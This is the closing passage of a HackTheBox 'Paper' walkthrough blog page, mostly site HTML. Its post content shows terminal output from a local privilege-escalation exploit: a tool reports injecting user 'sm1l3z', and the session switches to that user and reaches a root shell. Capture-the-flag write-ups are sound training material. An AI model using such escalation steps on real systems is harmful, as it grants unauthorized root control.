<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="k">Try</span> <span class="n">to</span> <span class="n">login</span> <span class="k">as</span> <span class="n">the</span> <span class="n">injected</span> <span class="n">user</span> <span class="n">using</span> <span class="n">sudo</span> <span class="o">-</span> <span class="n">sm1l3z</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="nc">When</span> <span class="n">prompted</span> <span class="k">for</span> <span class="n">password</span><span class="p">,</span> <span class="n">enter</span> <span class="n">your</span> <span class="n">password</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="k">If</span> <span class="n">the</span> <span class="n">username</span> <span class="n">is</span> <span class="n">inserted</span><span class="p">,</span> <span class="n">but</span> <span class="n">the</span> <span class="n">login</span> <span class="n">fails</span><span class="p">;</span> <span class="k">try</span> <span class="n">running</span> <span class="n">the</span> <span class="n">exploit</span> <span class="n">again</span><span class="mf">.</span>
<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="k">If</span> <span class="n">the</span> <span class="n">login</span> <span class="n">was</span> <span class="n">succesful</span><span class="p">,</span><span class="n">simply</span> <span class="n">enter</span> <span class="s1">'sudo bash'</span> <span class="k">and</span> <span class="n">drop</span> <span class="n">into</span> <span class="n">a</span> <span class="n">root</span> <span class="n">shell</span><span class="o">!</span>
<span class="p">[</span><span class="n">dwight</span><span class="o">@</span><span class="n">paper</span> <span class="n">tmp</span><span class="p">]</span><span class="err">$</span> <span class="n">su</span> <span class="o">-</span> <span class="n">sm1l3z</span>
<span class="nc">Password</span><span class="o">:</span>
<span class="p">[</span><span class="n">sm1l3z</span><span class="o">@</span><span class="n">paper</span> <span class="o">~</span><span class="p">]</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">su</span>

<span class="nc">We</span> <span class="n">trust</span> <span class="n">you</span> <span class="n">have</span> <span class="n">received</span> <span class="n">the</span> <span class="n">usual</span> <span class="n">lecture</span> <span class="n">from</span> <span class="n">the</span> <span class="n">local</span> <span class="nc">System</span>
<span class="nc">Administrator</span><span class="mf">.</span> <span class="nc">It</span> <span class="n">usually</span> <span class="n">boils</span> <span class="n">down</span> <span class="n">to</span> <span class="n">these</span> <span class="n">three</span> <span class="n">things</span><span class="o">:</span>

    <span class="c1">#1) Respect the privacy of others.</span>
    <span class="c1">#2) Think before you type.</span>
    <span class="c1">#3) With great power comes great responsibility.</span>

<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">sm1l3z</span><span class="o">:</span>
<span class="p">[</span><span class="n">root</span><span class="o">@</span><span class="n">paper</span> <span class="n">sm1l3z</span><span class="p">]</span><span class="c1"># wc -c /root/root.txt</span>
<span class="mi">33</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="mf">.</span><span class="n">txt</span>
</pre></td></tr></tbody></table></code></div></div>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>HackTheBox</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a>
      
      <a href="/tags/easy/"
          class="post-tag no-text-decoration" >easy</a>
      
      <a href="/tags/wordpress/"
          class="post-tag no-text-decoration" >wordpress</a>
      
      <a href="/tags/rocket-chat/"
          class="post-tag no-text-decoration" >rocket chat</a>
      
      <a href="/tags/cve/"
          class="post-tag no-text-decoration" >cve</a>
      
      <a href="/tags/lfi/"
          class="post-tag no-text-decoration" >lfi</a>
      
      <a href="/tags/unintended/"
          class="post-tag no-text-decoration" >unintended</a>
      
      <a href="/tags/pkexec/"
          class="post-tag no-text-decoration" >pkexec</a>
      
      <a href="/tags/polkit/"
          class="post-tag no-text-decoration" >polkit</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+Paper+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+Paper+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fpaper%2F&text=Hack+The+Box+-+Paper+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/meta/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1654876800"
    data-df="ll"
    >
  Jun 11, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Meta</h3>
            <div class="text-muted small">
              <p>
                





                Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE i...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/scanned/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1662739200"
    data-df="ll"
    >
  Sep 10, 2022
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Scanned</h3>
            <div class="text-muted small">
              <p>
                





                Scanned is an insane rated machine on HackTheBox created by clubby789. For the user part we will escape a chroot jail to read the database file of a web server giving us ssh access because of reuse...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Investigation/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1682092800"
    data-df="ll"
    >
  Apr 22, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Investigation</h3>
            <div class="text-muted small">
              <p>
                





                In this machine, I had to exploit a known vulnerability in exiftool, find a password in some logs, and finally reverse a program to find how to exploit it.


  Room: Investigation
  Difficulty: Med...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/meta/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - Meta</p>
  </a>
  

  
  <a href="/posts/scanned/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Scanned</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          © 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

